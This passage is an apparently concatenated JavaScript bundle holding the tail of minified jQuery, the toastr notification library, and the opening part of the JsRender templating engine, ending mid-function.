null==e.elem[e.prop]||e.elem.style&&null!=e.elem.style[e.prop]?(t=ot.css(e.elem,e.prop,""),t&&"auto"!==t?t:0):e.elem[e.prop]},set:function(e){ot.fx.step[e.prop]?ot.fx.step[e.prop](e):e.elem.style&&(null!=e.elem.style[ot.cssProps[e.prop]]||ot.cssHooks[e.prop])?ot.style(e.elem,e.prop,e.now+e.unit):e.elem[e.prop]=e.now}}},R.propHooks.scrollTop=R.propHooks.scrollLeft={set:function(e){e.elem.nodeType&&e.elem.parentNode&&(e.elem[e.prop]=e.now)}},ot.each(["toggle","show","hide"],function(e,t){var n=ot.fn[t];ot.fn[t]=function(e,r,i){return null==e||"boolean"==typeof e?n.apply(this,arguments):this.animate(W(t,!0),e,r,i)}}),ot.fn.extend({fadeTo:function(e,t,n,r){return this.filter(x).css("opacity",0).show().end().animate({opacity:t},e,n,r)},animate:function(e,t,n,r){var i=ot.isEmptyObject(e),o=ot.speed(t,n,r),s=function(){var t=F(this,ot.extend({},e),o);s.finish=function(){t.stop(!0)},(i||mt.get(this,"finish"))&&t.stop(!0)};return s.finish=s,i||o.queue===!1?this.each(s):this.queue(o.queue,s)},stop:function(e,n,r){var i=function(e){var t=e.stop;delete e.stop,t(r)};return"string"!=typeof e&&(r=n,n=e,e=t),n&&e!==!1&&this.queue(e||"fx",[]),this.each(function(){var t=!0,n=null!=e&&e+"queueHooks",o=ot.timers,s=mt.get(this);if(n)s[n]&&s[n].stop&&i(s[n]);else for(n in s)s[n]&&s[n].stop&&Ln.test(n)&&i(s[n]);for(n=o.length;n--;)o[n].elem!==this||null!=e&&o[n].queue!==e||(o[n].anim.stop(r),t=!1,o.splice(n,1));(t||!r)&&ot.dequeue(this,e)})},finish:function(e){return e!==!1&&(e=e||"fx"),this.each(function(){var t,n=mt.get(this),r=n[e+"queue"],i=n[e+"queueHooks"],o=ot.timers,s=r?r.length:0;for(n.finish=!0,ot.queue(this,e,[]),i&&i.cur&&i.cur.finish&&i.cur.finish.call(this),t=o.length;t--;)o[t].elem===this&&o[t].queue===e&&(o[t].anim.stop(!0),o.splice(t,1));for(t=0;s>t;t++)r[t]&&r[t].finish&&r[t].finish.call(this);delete n.finish})}}),ot.each({slideDown:W("show"),slideUp:W("hide"),slideToggle:W("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(e,t){ot.fn[e]=function(e,n,r){return this.animate(t,e,n,r)}}),ot.speed=function(e,t,n){var r=e&&"object"==typeof e?ot.extend({},e):{complete:n||!n&&t||ot.isFunction(e)&&e,duration:e,easing:n&&t||t&&!ot.isFunction(t)&&t};return r.duration=ot.fx.off?0:"number"==typeof r.duration?r.duration:r.duration in ot.fx.speeds?ot.fx.speeds[r.duration]:ot.fx.speeds._default,(null==r.queue||r.queue===!0)&&(r.queue="fx"),r.old=r.complete,r.complete=function(){ot.isFunction(r.old)&&r.old.call(this),r.queue&&ot.dequeue(this,r.queue)},r},ot.easing={linear:function(e){return e},swing:function(e){return.5-Math.cos(e*Math.PI)/2}},ot.timers=[],ot.fx=R.prototype.init,ot.fx.tick=function(){var e,n=ot.timers,r=0;for(Sn=ot.now();n.length>r;r++)e=n[r],e()||n[r]!==e||n.splice(r--,1);n.length||ot.fx.stop(),Sn=t},ot.fx.timer=function(e){e()&&ot.timers.push(e)&&ot.fx.start()},ot.fx.interval=13,ot.fx.start=function(){jn||(jn=setInterval(ot.fx.tick,ot.fx.interval))},ot.fx.stop=function(){clearInterval(jn),jn=null},ot.fx.speeds={slow:600,fast:200,_default:400},ot.fx.step={},ot.expr&&ot.expr.filters&&(ot.expr.filters.animated=function(e){return ot.grep(ot.timers,function(t){return e===t.elem}).length}),ot.fn.offset=function(e){if(arguments.length)return e===t?this:this.each(function(t){ot.offset.setOffset(this,e,t)});var n,r,i=this[0],o={top:0,left:0},s=i&&i.ownerDocument;if(s)return n=s.documentElement,ot.contains(n,i)?(typeof i.getBoundingClientRect!==z&&(o=i.getBoundingClientRect()),r=B(s),{top:o.top+r.pageYOffset-n.clientTop,left:o.left+r.pageXOffset-n.clientLeft}):o},ot.offset={setOffset:function(e,t,n){var r,i,o,s,a,u,c,l=ot.css(e,"position"),f=ot(e),p={};"static"===l&&(e.style.position="relative"),a=f.offset(),o=ot.css(e,"top"),u=ot.css(e,"left"),c=("absolute"===l||"fixed"===l)&&(o+u).indexOf("auto")>-1,c?(r=f.position(),s=r.top,i=r.left):(s=parseFloat(o)||0,i=parseFloat(u)||0),ot.isFunction(t)&&(t=t.call(e,n,a)),null!=t.top&&(p.top=t.top-a.top+s),null!=t.left&&(p.left=t.left-a.left+i),"using"in t?t.using.call(e,p):f.css(p)}},ot.fn.extend({position:function(){if(this[0]){var e,t,n=this[0],r={top:0,left:0};return"fixed"===ot.css(n,"position")?t=n.getBoundingClientRect():(e=this.offsetParent(),t=this.offset(),ot.nodeName(e[0],"html")||(r=e.offset()),r.top+=ot.css(e[0],"borderTopWidth",!0),r.left+=ot.css(e[0],"borderLeftWidth",!0)),{top:t.top-r.top-ot.css(n,"marginTop",!0),left:t.left-r.left-ot.css(n,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){for(var e=this.offsetParent||U;e&&!ot.nodeName(e,"html")&&"static"===ot.css(e,"position");)e=e.offsetParent;return e||U})}}),ot.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(n,r){var i="pageYOffset"===r;ot.fn[n]=function(o){return ot.access(this,function(n,o,s){var a=B(n);return s===t?a?a[r]:n[o]:(a?a.scrollTo(i?e.pageXOffset:s,i?s:e.pageYOffset):n[o]=s,t)},n,o,arguments.length,null)}}),ot.each({Height:"height",Width:"width"},function(e,n){ot.each({padding:"inner"+e,content:n,"":"outer"+e},function(r,i){ot.fn[i]=function(i,o){var s=arguments.length&&(r||"boolean"!=typeof i),a=r||(i===!0||o===!0?"margin":"border");return ot.access(this,function(n,r,i){var o;return ot.isWindow(n)?n.document.documentElement["client"+e]:9===n.nodeType?(o=n.documentElement,Math.max(n.body["scroll"+e],o["scroll"+e],n.body["offset"+e],o["offset"+e],o["client"+e])):i===t?ot.css(n,r,a):ot.style(n,r,i,a)},n,s?i:t,s,null)}})}),ot.fn.size=function(){return this.length},ot.fn.andSelf=ot.fn.addBack,"object"==typeof module&&"object"==typeof module.exports?module.exports=ot:"function"==typeof define&&define.amd&&define("jquery",[],function(){return ot}),"object"==typeof e&&"object"==typeof e.document&&(e.jQuery=e.$=ot)})(this);
// js/toastr.js
;(function(window,$){window.toastr=(function(){var
defaults={tapToDismiss:true,toastClass:'toast',containerId:'toast-container',debug:false,fadeIn:300,fadeOut:1000,extendedTimeOut:1000,iconClasses:{error:'toast-error',info:'toast-info',success:'toast-success',warning:'toast-warning'},iconClass:'toast-info',positionClass:'toast-top-right',timeOut:5000,titleClass:'toast-title',messageClass:'toast-message'},error=function(message,title){return notify({iconClass:getOptions().iconClasses.error,message:message,title:title})},getContainer=function(options){var $container=$('#'+options.containerId)
if($container.length)
return $container
$container=$('<div/>').attr('id',options.containerId).addClass(options.positionClass)
$container.appendTo($('body'))
return $container},getOptions=function(){return $.extend({},defaults,toastr.options)},info=function(message,title){return notify({iconClass:getOptions().iconClasses.info,message:message,title:title})},notify=function(map){var
options=getOptions(),iconClass=map.iconClass||options.iconClass,intervalId=null,$container=getContainer(options),$toastElement=$('<div/>'),$titleElement=$('<div/>'),$messageElement=$('<div/>'),response={options:options,map:map}
if(map.iconClass){$toastElement.addClass(options.toastClass).addClass(iconClass)}
if(map.title){$titleElement.append(map.title).addClass(options.titleClass)
$toastElement.append($titleElement)}
if(map.message){$messageElement.append(map.message).addClass(options.messageClass)
$toastElement.append($messageElement)}
var fadeAway=function(){if($(':focus',$toastElement).length>0)
return
var fade=function(){return $toastElement.fadeOut(options.fadeOut)}
$.when(fade()).done(function(){if($toastElement.is(':visible')){return}
$toastElement.remove()
if($container.children().length===0)
$container.remove()})}
var delayedFadeAway=function(){if(options.timeOut>0||options.extendedTimeOut>0){intervalId=setTimeout(fadeAway,options.extendedTimeOut)}}
var stickAround=function(){clearTimeout(intervalId)
$toastElement.stop(true,true).fadeIn(options.fadeIn)}
$toastElement.hide()
$container.prepend($toastElement)
$toastElement.fadeIn(options.fadeIn)
if(options.timeOut>0){intervalId=setTimeout(fadeAway,options.timeOut)}
$toastElement.hover(stickAround,delayedFadeAway)
if(options.tapToDismiss){$toastElement.click(fadeAway)}
if(options.debug){console.log(response)}
return $toastElement},success=function(message,title){return notify({iconClass:getOptions().iconClasses.success,message:message,title:title})},warning=function(message,title){return notify({iconClass:getOptions().iconClasses.warning,message:message,title:title})}
return{error:error,info:info,options:{},success:success,warning:warning}})()}(window,jQuery));
// js/vendor/jsrender.js

(function(global,jQuery,undefined){"use strict";if(jQuery&&jQuery.views||global.jsviews){return;}
var versionNumber="v1.0pre",$,jsvStoreName,rTag,rTmplString,delimOpenChar0="{",delimOpenChar1="{",delimCloseChar0="}",delimCloseChar1="}",linkChar="^",rPath=/^(?:null|true|false|\d[\d.]*|([\w$]+|\.|~([\w$]+)|#(view|([\w$]+))?)([\w$.^]*?)(?:[.[^]([\w$]+)\]?)?)$/g,rParams=/(\()(?=\s*\()|(?:([([])\s*)?(?:([#~]?[\w$.^]+)?\s*((\+\+|--)|\+|-|&&|\|\||===|!==|==|!=|<=|>=|[<>%*!:?\/]|(=))\s*|([#~]?[\w$.^]+)([([])?)|(,\s*)|(\(?)\\?(?:(')|("))|(?:\s*(([)\]])(?=\s*\.|\s*\^)|[)\]])([([]?))|(\s+)/g,rNewLine=/\s*\n/g,rUnescapeQuotes=/\\(['"])/g,rEscapeQuotes=/\\?(['"\\])/g,rBuildHash=/\x08(~)?([^\x08]+)\x08/g,rTestElseIf=/^if\s/,rFirstElem=/<(\w+)[>\s]/,rPrevElem=/<(\w+)[^>\/]*>[^>]*$/,rAttrEncode=/[><"'&]/g,rHtmlEncode=/[><"'&]/g,autoTmplName=0,viewId=0,charEntities={"&":"&amp;","<":"&lt;",">":"&gt;","\x00":"&#0;","'":"&#39;",'"':"&#34;"},tmplAttr="data-jsv-tmpl",slice=[].slice,$render={},jsvStores={template:{compile:compileTmpl},tag:{compile:compileTag},helper:{},converter:{}},$views={jsviews:versionNumber,render:$render,settings:{delimiters:$viewsDelimiters,debugMode:true,tryCatch:true},sub:{View:View,Error:JsViewsError,tmplFn:tmplFn,parse:parseParams,extend:$extend,error:error,syntaxError:syntaxError},_cnvt:convertVal,_tag:renderTag,_err:function(e){return $viewsSettings.debugMode?("Error: "+(e.message||e))+". ":'';}};function JsViewsError(message,object){if(object&&object.onError){if(object.onError(message)===false){return;}}
this.name="JsRender Error";this.message=message||"JsRender error";}
function $extend(target,source){var name;target=target||{};for(name in source){target[name]=source[name];}
return target;}
(JsViewsError.prototype=new Error()).constructor=JsViewsError;function $viewsDelimiters(openChars,closeChars,link){if(!$viewsSub.rTag||arguments.length){delimOpenChar0=openChars?openChars.charAt(0):delimOpenChar0;delimOpenChar1=openChars?openChars.charAt(1):delimOpenChar1;delimCloseChar0=closeChars?closeChars.charAt(0):delimCloseChar0;delimCloseChar1=closeChars?closeChars.charAt(1):delimCloseChar1;linkChar=link||linkChar;openChars="\\"+delimOpenChar0+"(\\"+linkChar+")?\\"+delimOpenChar1;closeChars="\\"+delimCloseChar0+"\\"+delimCloseChar1;rTag="(?:(?:(\\w+(?=[\\/\\s\\"+delimCloseChar0+"]))|(?:(\\w+)?(:)|(>)|!--((?:[^-]|-(?!-))*)--|(\\*)))"
+"\\s*((?:[^\\"+delimCloseChar0+"]|\\"+delimCloseChar0+"(?!\\"+delimCloseChar1+"))*?)";$viewsSub.rTag=rTag+")";rTag=new RegExp(openChars+rTag+"(\\/)?|(?:\\/(\\w+)))"+closeChars,"g");rTmplString=new RegExp("<.*>|([^\\\\]|^)[{}]|"+openChars+".*"+closeChars);}
return[delimOpenChar0,delimOpenChar1,delimCloseChar0,delimCloseChar1,linkChar];}
function getView(inner,type){if(!type){type=inner;inner=undefined;}
var views,i,l,found,view=this,root=!type||type==="root";if(inner){found=view.type===type?view:undefined;if(!found){views=view.views;if(view._.useKey){for(i in views){if(found=views[i].get(inner,type)){break;}}}else for(i=0,l=views.length;!found&&i<l;i++){found=views[i].get(inner,type);}}}else if(root){while(view.parent.parent){found=view=view.parent;}}else while(view&&!found){found=view.type===type?view:undefined;view=view.parent;}
return found;}
function getIndex(){var view=this.get("item");return view?view.index:undefined;}
getIndex.depends=function(){return[this.get("item"),"index"];};function getHelper(helper){var wrapped,view=this,res=(view.ctx||{})[helper];res=res===undefined?view.getRsc("helpers",helper):res;if(res){if(typeof res==="function"){wrapped=function(){return res.apply(view,arguments);};$extend(wrapped,res);}}
return wrapped||res;}
function convertVal(converter,view,tagCtx){var tmplConverter,tag,value,boundTagCtx=+tagCtx===tagCtx&&tagCtx,linkCtx=view.linkCtx;if(boundTagCtx){tagCtx=(boundTagCtx=view.tmpl.bnds[boundTagCtx-1])(view.data,view,$views);}
value=tagCtx.args[0];if(converter||boundTagCtx){tag=linkCtx&&linkCtx.tag||{_:{inline:!linkCtx},tagName:converter+":",flow:true,_is:"tag"};tag._.bnd=boundTagCtx;if(linkCtx){linkCtx.tag=tag;tag.linkCtx=linkCtx;tagCtx.ctx=extendCtx(tagCtx.ctx,linkCtx.view.ctx);}
tag.tagCtx=tagCtx;tagCtx.view=view;tag.ctx=tagCtx.ctx||{};delete tagCtx.ctx;view._.tag=tag;converter=converter!=="true"&&converter;if(converter&&((tmplConverter=view.getRsc("converters",converter))||error("Unknown converter: {{"+converter+":"))){tag.depends=tmplConverter.depends;value=tmplConverter.apply(tag,tagCtx.args);}
value=boundTagCtx&&view._.onRender?view._.onRender(value,view,boundTagCtx):value;view._.tag=undefined;}
return value;}
function getResource(resourceType,itemName){var res,view=this,store=$views[resourceType];res=store&&store[itemName];while((res===undefined)&&view){store=view.tmpl[resourceType];res=store&&store[itemName];view=view.parent;}
return res;}
function renderTag(tagName,parentView,tmpl,tagCtxs){var render,tag,tags,attr,isElse,parentTag,i,l,itemRet,tagCtx,tagCtxCtx,content,boundTagFn,tagDef,ret="",boundTagKey=+tagCtxs===tagCtxs&&tagCtxs,linkCtx=parentView.linkCtx||0,ctx=parentView.ctx,parentTmpl=tmpl||parentView.tmpl,parentView_=parentView._;if(tagName._is==="tag"){tag=tagName;tagName=tag.tagName;}
if(boundTagKey){tagCtxs=(boundTagFn=parentTmpl.bnds[boundTagKey-1])(parentView.data,parentView,$views);}
l=tagCtxs.length;tag=tag||linkCtx.tag;for(i=0;i<l;i++){tagCtx=tagCtxs[i];content=tagCtx.tmpl;content=tagCtx.content=content&&parentTmpl.tmpls[content-1];tmpl=tagCtx.props.tmpl;if(!i&&(!tmpl||!tag)){tagDef=parentView.getRsc("tags",tagName)||error("Unknown tag: {{"+tagName+"}}");}
tmpl=tmpl||!i&&tagDef.template||content;tmpl=""+tmpl===tmpl?parentView.getRsc("templates",tmpl)||$templates(tmpl):tmpl;$extend(tagCtx,{tmpl:tmpl,render:renderContent,index:i,view:parentView,ctx:extendCtx(tagCtx.ctx,ctx)});if(!tag){if(tagDef.init){tag=new tagDef.init(tagCtx,linkCtx,ctx);tag.attr=tag.attr||tagDef.attr||undefined;}else{tag={render:tagDef.render};}
tag._={inline:!linkCtx};if(linkCtx){linkCtx.attr=tag.attr=linkCtx.attr||tag.attr;linkCtx.tag=tag;tag.linkCtx=linkCtx;}
if(tag._.bnd=boundTagFn||linkCtx){tag._.arrVws={};}
tag.tagName=tagName;tag.parent=parentTag=ctx&&ctx.tag,tag._is="tag";}
parentView_.tag=tag;tagCtx.tag=tag;tag.tagCtxs=tagCtxs;tag.rendering={};if(!tag.flow){tagCtxCtx=tagCtx.ctx=tagCtx.ctx||{};tags=tagCtxCtx.parentTags=ctx&&extendCtx(tagCtxCtx.parentTags,ctx.parentTags)||{};if(parentTag){tags[parentTag.tagName]=parentTag;}
tagCtxCtx.tag=tag;}}
for(i=0;i<l;i++){tagCtx=tag.tagCtx=tagCtxs[i];tag.ctx=tagCtx.ctx;if(render=tag.render){itemRet=render.apply(tag,tagCtx.args);}
ret+=itemRet!==undefined?itemRet:tagCtx.tmpl?tagCtx.render():"";}
delete tag.rendering;tag.tagCtx=tag.tagCtxs[0];tag.ctx=tag.tagCtx.ctx;if(tag._.inline&&(attr=tag.attr)&&attr!=="html"){ret=attr==="text"?$converters.html(ret):"";}
return ret=boundTagKey&&parentView._.onRender?parentView._.onRender(ret,parentView,boundTagKey):ret;}
function View(context,type,parentView,data,template,key,contentTmpl,onRender){var views,parentView_,tag,isArray=type==="array",self_={key:0,useKey:isArray?0:1,id:""+viewId++,onRender:onRender,bnds:{}},self={data:data,tmpl:template,content:contentTmpl,views:isArray?[]:{},parent:parentView,ctx:context,type:type,get:getView,getIndex:getIndex,getRsc:getResource,hlp:getHelper,_:self_,_is:"view"};if(parentView){views=parentView.views;parentView_=parentView._;if(parentView_.useKey){views[self_.key="_"+parentView_.useKey++]=self;tag=parentView_.tag;self_.bnd=isArray&&(!tag||!!tag._.bnd&&tag);}else{views.splice(self_.key=self.index=key!==undefined?key:views.length,0,self);}
self.ctx=context||parentView.ctx;}
return self;}
function compileChildResources(parentTmpl){var storeName,resources,resourceName,settings,compile;for(storeName in jsvStores){settings=jsvStores[storeName];if((compile=settings.compile)&&(resources=parentTmpl[storeName+"s"])){for(resourceName in resources){resources[resourceName]=compile(resourceName,resources[resourceName],parentTmpl,storeName,settings);}}}}
function compileTag(name,item,parentTmpl){var init,tmpl;if(typeof item==="function"){item={depends:item.depends,render:item};}else{if(tmpl=item.template){item.template=""+tmpl===tmpl?($templates[tmpl]||$templates(tmpl)):tmpl;}
if(item.init!==false){init=item.init=item.init||function(tagCtx){};init.prototype=item;(init.prototype=item).constructor=init;}}
if(parentTmpl){item._parentTmpl=parentTmpl;}
return item;}
function compileTmpl(name,tmpl,parentTmpl,storeName,storeSettings,options){function tmplOrMarkupFromStr(value){if((""+value===value)||value.nodeType>0){try{elem=value.nodeType>0?value:!rTmplString.test(value)&&jQuery&&jQuery(global.document).find(value)[0];}catch(e){}
if(elem){value=elem.getAttribute(tmplAttr);name=name||value;value=$templates[value];if(!value){name=name||"_"+autoTmplName++;elem.setAttribute(tmplAttr,name);value=$templates[name]=compileTmpl(name,elem.innerHTML,parentTmpl,storeName,storeSettings,options);}}
return value;}}
var tmplOrMarkup,elem;tmpl=tmpl||"";tmplOrMarkup=tmplOrMarkupFromStr(tmpl);options=options||(tmpl.markup?tmpl:{});options.tmplName=name;if(parentTmpl){options._parentTmpl=parentTmpl;}
if(!tmplOrMarkup&&tmpl.markup&&(tmplOrMarkup=tmplOrMarkupFromStr(tmpl.markup))){if(tmplOrMarkup.fn&&(tmplOrMarkup.debug!==tmpl.debug||tmplOrMarkup.allowCode!==tmpl.allowCode)){tmplOrMarkup=tmplOrMarkup.markup;}}
if(tmplOrMarkup!==undefined){if(name&&!parentTmpl){$render[name]=function(){return tmpl.render.apply(tmpl,arguments);};}
if(tmplOrMarkup.fn||tmpl.fn){if(tmplOrMarkup.fn){if(name&&name!==tmplOrMarkup.tmplName){tmpl=extendCtx(options,tmplOrMarkup);}else{tmpl=tmplOrMarkup;}}}else{tmpl=TmplObject(tmplOrMarkup,options);tmplFn(tmplOrMarkup,tmpl);}
compileChildResources(options);return tmpl;}}
function TmplObject(markup,options){var htmlTag,wrapMap=$viewsSettings.wrapMap||{},tmpl=$extend({markup:markup,tmpls:[],links:{},tags:{},bnds:[],_is:"template",render:renderContent},options);if(!options.htmlTag){htmlTag=rFirstElem.exec(markup);tmpl.htmlTag=htmlTag?htmlTag[1].toLowerCase():"";}
htmlTag=wrapMap[tmpl.htmlTag];if(htmlTag&&htmlTag!==wrapMap.div){tmpl.markup=$.trim(tmpl.markup);tmpl._elCnt=true;}
return tmpl;}
function registerStore(storeName,storeSettings){function theStore(name,item,parentTmpl){var onStore,compile,itemName,thisStore;if(name&&""+name!==name&&!name.nodeType&&!name.markup){for(itemName in name){theStore(itemName,name[itemName],item);}
return $views;}
if(item===undefined){item=name;name=undefined;}
if(name&&""+name!==name){parentTmpl=item;item=name;name=undefined;}
thisStore=parentTmpl?parentTmpl[storeNames]=parentTmpl[storeNames]||{}:theStore;compile=storeSettings.compile;if(onStore=$viewsSub.onBeforeStoreItem){compile=onStore(thisStore,name,item,compile)||compile;}
if(!name){item=compile(undefined,item);}else if(item===null){delete thisStore[name];}else{thisStore[name]=compile?(item=compile(name,item,parentTmpl,storeName,storeSettings)):item;}
if(item){item._is=storeName;}
if(onStore=$viewsSub.onStoreItem){onStore(thisStore,name,item,compile);}
return item;}
var storeNames=storeName+"s";$views[storeNames]=theStore;jsvStores[storeName]=storeSettings;}
function renderContent(data,context,parentView,key,isLayout,onRender){var i,l,dataItem,newView,childView,itemResult,swapContent,tagCtx,contentTmpl,tag_,outerOnRender,tmplName,tmpl,self=this,allowDataLink=!self.attr||self.attr==="html",result="";if(key===true){swapContent=true;key=0;}
if(self.tag){tagCtx=self;self=self.tag;tag_=self._;tmplName=self.tagName;tmpl=tagCtx.tmpl;context=extendCtx(context,self.ctx);contentTmpl=tagCtx.content;if(tagCtx.props.link===false){context=context||{};context.link=false;}
parentView=parentView||tagCtx.view;data=data===undefined?parentView:data;}else{tmpl=self.jquery&&(self[0]||error('Unknown template: "'+self.selector+'"'))||self;}
if(tmpl){if(!parentView&&data&&data._is==="view"){parentView=data;}
if(parentView){contentTmpl=contentTmpl||parentView.content;onRender=onRender||parentView._.onRender;if(data===parentView){data=parentView.data;isLayout=true;}
context=extendCtx(context,parentView.ctx);}
if(!parentView||parentView.data===undefined){(context=context||{}).root=data;}
if(!tmpl.fn){tmpl=$templates[tmpl]||$templates(tmpl);}
if(tmpl){onRender=(context&&context.link)!==false&&allowDataLink&&onRender;outerOnRender=onRender;if(onRender===true){outerOnRender=undefined;onRender=parentView._.onRender;}
if($.isArray(data)&&!isLayout){newView=swapContent?parentView:(key!==undefined&&parentView)||View(context,"array",parentView,data,tmpl,key,contentTmpl,onRender);for(i=0,l=data.length;i<l;i++){dataItem=data[i];childView=View(context,"item",newView,dataItem,tmpl,(key||0)+i,contentTmpl,onRender);itemResult=tmpl.fn(dataItem,childView,$views);result+=newView._.onRender?newView._.onRender(itemResult,childView):itemResult;}}else{newView=swapContent?parentView:View(context,tmplName||"data",parentView,data,tmpl,key,contentTmpl,onRender);if(tag_&&!self.flow){newView.tag=self;}
result+=tmpl.fn(data,newView,$views);}
return outerOnRender?outerOnRender(result,newView):result;}}
return"";}
function error(message){if($viewsSettings.debugMode){throw new $views.sub.Error(message);}}
function syntaxError(message){error("Syntax error\n"+message);}
function tmplFn(markup,tmpl,isLinkExpr,convertBack){function pushprecedingContent(shift){shift-=loc;if(shift){content.push(markup.substr(loc,shift).replace(rNewLine,"\\n"));}}
function blockTagCheck(tagName){tagName&&syntaxError('Unmatched or missing tag: "{{/'+tagName+'}}" in template:\n'+markup);}
function parseTag(all,bind,tagName,converter,colon,html,comment,codeTag,params,slash,closeBlock,index){if(html){colon=":";converter="html";}
slash=slash||isLinkExpr;var noError,current0,pathBindings=bind&&[],code="",hash="",passedCtx="",block=!slash&&!colon&&!comment;tagName=tagName||colon;pushprecedingContent(index);loc=index+all.length;if(codeTag){if(allowCode){content.push(["*","\n"+params.replace(rUnescapeQuotes,"$1")+"\n"]);}}else if(tagName){if(tagName==="else"){if(rTestElseIf.test(params)){syntaxError('for "{{else if expr}}" use "{{else expr}}"');}
pathBindings=current[6];current[7]=markup.substring(current[7],index);current=stack.pop();content=current[3];block=true;}
if(params){params=params.replace(rNewLine," ");code=parseParams(params,pathBindings,tmpl).replace(rBuildHash,function(all,isCtx,keyValue){if(isCtx){passedCtx+=keyValue+",";}else{hash+=keyValue+",";}
return"";});}
hash=hash.slice(0,-1);code=code.slice(0,-1);noError=hash&&(hash.indexOf("noerror:true")+1)&&hash||"";newNode=[tagName,converter||!!convertBack||"",code,block&&[],'params:"'+params+'",props:{'+hash+"}"
+(passedCtx?",ctx:{"+passedCtx.slice(0,-1)+"}":""),noError,pathBindings||0];content.push(newNode);if(block){stack.push(current);current=newNode;current[7]=loc;}}else if(closeBlock){current0=current[0];blockTagCheck(closeBlock!==current0&&current0!=="else"&&closeBlock);current[7]=markup.substring(current[7],index);current=stack.pop();}
blockTagCheck(!current&&closeBlock);content=current[3];}
var newNode,allowCode=tmpl&&tmpl.allowCode,astTop=[],loc=0,stack=[],content=astTop,current=[,,,astTop];markup=markup.replace(rEscapeQuotes,"\\$1");blockTagCheck(stack[0]&&stack[0][3].pop()[0]);markup.replace(rTag,parseTag);pushprecedingContent(markup.length);if(loc=astTop[astTop.length-1]){blockTagCheck(""+loc!==loc&&(+loc[7]===loc[7])&&loc[0]);}
return buildCode(astTop,isLinkExpr?markup:tmpl,isLinkExpr);}
function buildCode(ast,tmpl,isLinkExpr){var i,node,tagName,converter,params,hash,hasTag,hasEncoder,getsVal,hasCnvt,useCnvt,tmplBindings,pathBindings,elseStartIndex,elseIndex,nestedTmpls,tmplName,nestedTmpl,tagAndElses,allowCode,content,markup,notElse,nextIsElse,oldCode,isElse,isGetVal,prm,tagCtxFn,tmplBindingKey=0,code="",noError="",tmplOptions={},l=ast.length;if(""+tmpl===tmpl){tmplName=isLinkExpr?'data-link="'+tmpl.replace(rNewLine," ").slice(1,-1)+'"':tmpl;tmpl=0;}else{tmplName=tmpl.tmplName||"unnamed";if(allowCode=tmpl.allowCode){tmplOptions.allowCode=true;}
if(tmpl.debug){tmplOptions.debug=true;}
tmplBindings=tmpl.bnds;nestedTmpls=tmpl.tmpls;}
for(i=0;i<l;i++){node=ast[i];if(""+node===node){code+='\nret+="'+node+'";';}else{tagName=node[0];if(tagName==="*"){code+=""+node[1];}else{converter=node[1];params=node[2];content=node[3];hash=node[4];noError=node[5];markup=node[7];if(!(isElse=tagName==="else")){tmplBindingKey=0;if(tmplBindings&&(pathBindings=node[6])){tmplBindingKey=tmplBindings.push(pathBindings);}}
if(isGetVal=tagName===":"){if(converter){tagName=converter==="html"?">":converter+tagName;}
if(noError){prm="prm"+i;noError="try{var "+prm+"=["+params+"][0];}catch(e){"+prm+'="";}\n';params=prm;}}else{if(content){nestedTmpl=TmplObject(markup,tmplOptions);nestedTmpl.tmplName=tmplName+"/"+tagName;buildCode(content,nestedTmpl);nestedTmpls.push(nestedTmpl);}
if(!isElse){tagAndElses=tagName;oldCode=code;code="";elseStartIndex=i;}
nextIsElse=ast[i+1];nextIsElse=nextIsElse&&nextIsElse[0]==="else";}
hash+=",args:["+params+"]}";if(isGetVal&&pathBindings||converter&&tagName!==">"){tagCtxFn=new Function("data,view,j,u"," // "
+tmplName+" "+tmplBindingKey+" "+tagName+"\n"+noError+"return {"+hash+";");tagCtxFn.paths=pathBindings;tagCtxFn._ctxs=tagName;if(isLinkExpr){return tagCtxFn;}
useCnvt=1;}
code+=(isGetVal?"\n"+(pathBindings?"":noError)+(isLinkExpr?"return ":"ret+=")+(useCnvt?(useCnvt=0,hasCnvt=true,'c("'+converter+'",view,'+(pathBindings?((tmplBindings[tmplBindingKey-1]=tagCtxFn),tmplBindingKey):"{"+hash)+");"):tagName===">"?(hasEncoder=true,"h("+params+");"):(getsVal=true,"(v="+params+")!="+(isLinkExpr?"=":"")+'u?v:"";')):(hasTag=true,"{tmpl:"
+(content?nestedTmpls.length:"0")+","
+hash+","));if(tagAndElses&&!nextIsElse){code="["+code.slice(0,-1)+"]";if(isLinkExpr||pathBindings){code=new Function("data,view,j,u"," // "+tmplName+" "+tmplBindingKey+" "+tagAndElses+"\nreturn "+code+";");if(pathBindings){(tmplBindings[tmplBindingKey-1]=code).paths=pathBindings;}
code._ctxs=tagName;if(isLinkExpr){return code;}}
code=oldCode+'\nret+=t("'+tagAndElses+'",view,this,'+(tmplBindingKey||code)+");";pathBindings=0;tagAndElses=0;}}}}
code="// "+tmplName
+"\nvar j=j||"+(jQuery?"jQuery.":"js")+"views"
+(getsVal?",v":"")
+(hasTag?",t=j._tag":"")
+(hasCnvt?",c=j._cnvt":"")
+(hasEncoder?",h=j.converters.html":"")
+(isLinkExpr?";\n":',ret="";\n')
+($viewsSettings.tryCatch?"try{\n":"")
+(tmplOptions.debug?"debugger;":"")
+code+(isLinkExpr?"\n":"\nreturn ret;\n")
+($viewsSettings.tryCatch?"\n}catch(e){return j._err(e);}":"");try{code=new Function("data,view,j,u",code);}catch(e){syntaxError("Compiled template code:\n\n"+code,e);}
if(tmpl){tmpl.fn=code;}
return code;}
function parseParams(params,bindings,tmpl){function parseTokens(all,lftPrn0,lftPrn,path,operator,err,eq,path2,prn,comma,lftPrn2,apos,quot,rtPrn,rtPrnDot,prn2,space,index,full){var expr;operator=operator||"";lftPrn=lftPrn||lftPrn0||lftPrn2;path=path||path2;prn=prn||prn2||"";function parsePath(all,object,helper,view,viewProperty,pathTokens,leafToken){if(object){bindings&&!isAlias&&bindings.push(path);if(object!=="."){var ret=(helper?'view.hlp("'+helper+'")':view?"view":"data")
+(leafToken?(viewProperty?"."+viewProperty:helper?"":(view?"":"."+object))+(pathTokens||""):(leafToken=helper?"":view?viewProperty||"":object,""));ret=ret+(leafToken?"."+leafToken:"");return ret.slice(0,9)==="view.data"?ret.slice(5):ret;}}
return all;}
if(err){syntaxError(params);}else{if(bindings&&rtPrnDot){expr=pathStart[parenDepth]
